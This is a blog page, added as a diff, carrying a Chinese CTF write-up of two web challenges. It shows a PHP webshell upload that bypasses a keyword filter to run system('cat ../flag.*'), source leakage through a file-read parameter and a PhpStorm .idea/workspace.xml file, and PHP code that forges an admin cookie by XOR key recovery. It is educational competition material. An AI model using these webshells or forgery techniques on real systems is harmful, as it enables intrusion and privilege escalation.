@@ -1,0 +1,811 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Web," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=0.5.0" />
+
+
+
+
+
+
+<meta name="description" content="1.Upload题目:想怎么传就怎么传，就是这么任性。hint:flag在flag.php里根据题目理解，对上传的文件类型没有限制，题目界面就是一个上传文件的form表试着上传.jpg格式的图片，显示上传成功，并返回了存放该图片的地址信息思路就非常清晰了，就是要通过上传的文件来弹出flag，因为对上传的文件没有类型限制，所以可以直接上传.php文件，通过一句话木马进行调用system函数，.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="9月i春秋周赛web篇writeup">
+<meta property="og:url" content="http://yoursite.com/2016/09/04/9月i春秋周赛web篇writeup/index.html">
+<meta property="og:site_name" content="Watercow's Blog!">
+<meta property="og:description" content="1.Upload题目:想怎么传就怎么传，就是这么任性。hint:flag在flag.php里根据题目理解，对上传的文件类型没有限制，题目界面就是一个上传文件的form表试着上传.jpg格式的图片，显示上传成功，并返回了存放该图片的地址信息思路就非常清晰了，就是要通过上传的文件来弹出flag，因为对上传的文件没有类型限制，所以可以直接上传.php文件，通过一句话木马进行调用system函数，.php">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/1.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/2.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/3.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/4.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/5.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/6.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/7.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/8.png">
+<meta property="og:image" content="http://yoursite.com/images/2016 9 4/9.png">
+<meta property="og:updated_time" content="2016-09-11T13:21:11.096Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="9月i春秋周赛web篇writeup">
+<meta name="twitter:description" content="1.Upload题目:想怎么传就怎么传，就是这么任性。hint:flag在flag.php里根据题目理解，对上传的文件类型没有限制，题目界面就是一个上传文件的form表试着上传.jpg格式的图片，显示上传成功，并返回了存放该图片的地址信息思路就非常清晰了，就是要通过上传的文件来弹出flag，因为对上传的文件没有类型限制，所以可以直接上传.php文件，通过一句话木马进行调用system函数，.php">
+<meta name="twitter:image" content="http://yoursite.com/images/2016 9 4/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> 9月i春秋周赛web篇writeup | Watercow's Blog! </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Watercow's Blog!</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">简单粗暴的博客。</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="#" class="st-search-show-outputs">
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form">
+  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+</form>
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'oRJ2k_HKmkh8Fp72px-r','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                9月i春秋周赛web篇writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-04T12:39:24+08:00" content="2016-09-04">
+              2016-09-04
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/04/9月i春秋周赛web篇writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/04/9月i春秋周赛web篇writeup/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="1-Upload"><a href="#1-Upload" class="headerlink" title="1.Upload"></a>1.Upload</h3><p>题目:想怎么传就怎么传，就是这么任性。<br>hint:flag在flag.php里<br>根据题目理解，对上传的文件类型没有限制，题目界面就是一个上传文件的form表<br><img src="/images/2016 9 4/1.png" width="200px" heigth=""><br>试着上传<strong>.jpg</strong>格式的图片，显示上传成功，并返回了存放该图片的<strong>地址信息</strong><br><img src="/images/2016 9 4/2.png" width="500px" heigth=""><br>思路就非常清晰了，就是要通过上传的文件来弹出flag，<br>因为对上传的文件没有类型限制，所以可以直接上传<strong>.php</strong>文件，通过一句话木马进行调用system函数，<strong>.php</strong>文件内容如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"php"</span>&gt;</div><div class="line">system(<span class="string">'cat ../flag.*'</span>);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>至于<strong>cat</strong>后要接“..”,是因为从第一次返回的路径来看是保存在<strong>/u/</strong>的目录下，所以要先跳转回/u/。<br>但是上传却没有任何信息弹出，开始懵逼。。。<br><a id="more"></a><br>直到北航张博士的回答，原来是<strong>php</strong>会被过滤掉，文件里的内容会被改成<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">""</span>&gt;</div><div class="line">system(<span class="string">'cat ../flag.*'</span>);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>只要将php改成<strong>Php</strong>就可以防止被过滤掉，最后文件里的内容为：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"Php"</span>&gt;</div><div class="line">system(<span class="string">'cat ../flag.*'</span>);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>上传就会弹出flag!<br><img src="/images/2016 9 4/3.png" width="500px" heigth=""></p>
+<h3 id="2-code"><a href="#2-code" class="headerlink" title="2.code"></a>2.code</h3><p>题目:仅有网站链接<br>tips??:脑洞有多大??<br>打开链接，网站仅有一张图片(动漫人物并不认识)<br><img src="/images/2016 9 4/4.png" width="500px" heigth=""><br>查看源码发现有base64编码的内容，解码后就是图片的信息<br><img src="/images/2016 9 4/5.png" width="500px" heigth=""><br>卡住。。。。。半小时后，突发奇想，将链接中的<strong>index.php?jpg=hei.jpg</strong>改为<strong>index.php?jpg=index.php</strong>，查看源码，果然base64编码后的内容不同了，解码之后得到一段<strong>PHP代码</strong>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">   <span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line">	* Date: 2015/11/16</div><div class="line">	* Time: 1:31</div><div class="line"> */</div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</div><div class="line">   	header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</div><div class="line">$file = $_GET[<span class="string">'jpg'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</div><div class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</div><div class="line">$txt = base64_encode(file_get_contents($file));</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * Can you find the flag file?</div><div class="line"> *</div><div class="line"> */</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>然后。。。这段代码提醒了该网站的过滤规则，首先会将不是数字英文的全部过滤掉，其次将“<strong>config</strong>”这个单词替换为”_”下划线，其次好像没有什么线索了。。。又懵逼了！知道晚上，才想到信息不是隐藏在代码里，而是在<strong>注释</strong>里！！<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line">	* Date: 2015/11/16</div><div class="line">	* Time: 1:31</div><div class="line"> */</div></pre></td></tr></table></figure></p>
+<p>对，phpstorm这款IDE存在源码泄露问题，百度便知，phpstorm为了防止文件断电失存，就专门设置了一个项目部署文件(<strong>.idea/workspace.xml</strong>),果然将页面后缀改为<strong>.idea/workspace.xml</strong>之后就看到了部署文件，其中我找到了关键的几行：<br><img src="/images/2016 9 4/6.png" width="300px" heigth=""><br>之后在运用之前php代码里的过滤规则进行构造，即将链接中的<strong>index.php?jpg=hei.jpg</strong>改为<strong>index.php?jpg=fl3gconfigichunqiu.php</strong>,果然，同样base64解码之后得到了加解密的关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by PhpStorm.</div><div class="line">	* Date: 2015/11/16</div><div class="line">	* Time: 1:31</div><div class="line">	*/</div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</div><div class="line">   	$hash = <span class="string">''</span>;</div><div class="line">   	$max = strlen($chars) - <span class="number">1</span>;</div><div class="line">   	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</div><div class="line">       	$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">   	&#125;</div><div class="line">   	<span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">   	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">       	$tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</div><div class="line">   	&#125;</div><div class="line">  		$txt = $tmp;</div><div class="line">   	$rnd=random(<span class="number">4</span>);</div><div class="line">   	$key=md5($rnd.$key);</div><div class="line">  		$s=<span class="number">0</span>;</div><div class="line">   	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">       	<span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">       	$ttmp .= $txt[$i] ^ $key[++$s];</div><div class="line">   	&#125;</div><div class="line">   	<span class="keyword">return</span> base64_encode($rnd.$ttmp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</div><div class="line">   	$txt=base64_decode($txt);</div><div class="line">   	$rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</div><div class="line">   	$txt = substr($txt,<span class="number">4</span>);</div><div class="line">   	$key=md5($rnd.$key);</div><div class="line"></div><div class="line">   	$s=<span class="number">0</span>;</div><div class="line">   	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">       	<span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</div><div class="line">       	$tmp .= $txt[$i]^$key[++$s];</div><div class="line">   	&#125;</div><div class="line">   	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</div><div class="line">       	$tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</div><div class="line">   	&#125;</div><div class="line">   	<span class="keyword">return</span> $tmp1;</div><div class="line">&#125;</div><div class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</div><div class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</div><div class="line">   	<span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   	setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</div><div class="line">   	<span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>花了近一天的时间，写出了求逆的算法，一边写一边借鉴-。-，求解用户cookie的代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">   <span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ss</span><span class="params">($txt,$m)</span></span>&#123;</div><div class="line"> 	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($m);$i++)&#123; </div><div class="line">    	$tmp .= chr(ord($m[$i])+<span class="number">10</span>);</div><div class="line">  	&#125;</div><div class="line">  	$m=$tmp;</div><div class="line">  	$tmp=<span class="string">''</span>;</div><div class="line">  	$txt=base64_decode($txt);</div><div class="line">  	$rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</div><div class="line">  	$txt = substr($txt,<span class="number">4</span>);</div><div class="line">  	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</div><div class="line">    	$key .= $txt[$i] ^ $m[$i];</div><div class="line"> 	&#125;</div><div class="line">  	$s=<span class="string">'0123456789abcdef'</span>;</div><div class="line">  	$txt1=<span class="string">'system'</span>;</div><div class="line"> 	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt1);$i++)&#123;</div><div class="line">   	$tmp .= chr(ord($txt1[$i])+<span class="number">10</span>);</div><div class="line"> 	&#125;</div><div class="line"> 	$txt1=$tmp;</div><div class="line"> 	$tmp=<span class="string">''</span>;</div><div class="line"> 	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</div><div class="line">    	$tmp = $key.$s[$i];</div><div class="line">    	<span class="keyword">for</span>($ii=<span class="number">0</span>;$ii&lt;strlen($txt1);$ii++)&#123;</div><div class="line">      	$txt2 .= $txt1[$ii] ^ $tmp[$ii];</div><div class="line">    	&#125;</div><div class="line"> 	<span class="keyword">echo</span> base64_encode($rnd.$txt2);</div><div class="line">    	file_put_contents(<span class="string">'1.txt'</span>,base64_encode($rnd.$txt2).<span class="string">"\r\n"</span>,FILE_APPEND); </div><div class="line">    	$txt2=<span class="string">''</span>;</div><div class="line">  	&#125;</div><div class="line">  </div><div class="line">	&#125;</div><div class="line">	ss(<span class="string">'SXBVTBAaCU1I'</span>,<span class="string">'guest'</span>); <span class="comment">// 设置获取的guest用户的cookie值。</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在线找了一个<a href="http://www.shucunwang.com/RunCode/php/" target="_blank" rel="external">php运行网站</a><br>运行出来是16个base64加密后的cookie，其中只有一个是正确的，用burpsuit对这16个爆破，发现只有一个返回长度有差异<br><img src="/images/2016 9 4/7.png" width="400px" heigth=""><br>那这个准是正确的结果，用repeater重复一下，果然返回了flag!!!，做了一整天，终于搞定了这道题！！<br><img src="/images/2016 9 4/8.png" width="400px" heigth=""><br><img src="/images/2016 9 4/9.png" width="400px" heigth=""></p>
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag">#Web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/08/25/记一道pwn题详解/" rel="next" title="记一道pwn题详解">
+                <i class="fa fa-chevron-left"></i> 记一道pwn题详解
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/09/11/跨站脚本攻击总结/" rel="prev" title="跨站脚本攻击总结">
+                跨站脚本攻击总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/09/04/9月i春秋周赛web篇writeup/"
+           data-title="9月i春秋周赛web篇writeup" data-url="http://yoursite.com/2016/09/04/9月i春秋周赛web篇writeup/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/author.png"
+               alt="watercow" />
+          <p class="site-author-name" itemprop="name">watercow</p>
+          <p class="site-description motion-element" itemprop="description">手中两把锟斤拷，口中疾呼烫烫烫。</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+          
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/people/watercow" target="_blank">
+                  
+                    <i class="fa fa-globe"></i> zhihu
+                  
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/watercow" target="_blank">
+                  
+                    <i class="fa fa-github"></i> GitHub
+                  
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Upload"><span class="nav-number">1.</span> <span class="nav-text">1.Upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-code"><span class="nav-number">2.</span> <span class="nav-text">2.code</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
+            <i class="fa fa-angle-double-down"></i>
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">watercow</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  
+
+
+  
+
+
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=0.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=0.5.0"></script>
+
+
+
+  
+  
+<script type="text/javascript" src="/js/src/scrollspy.js?v=0.5.0"></script>
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 1 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
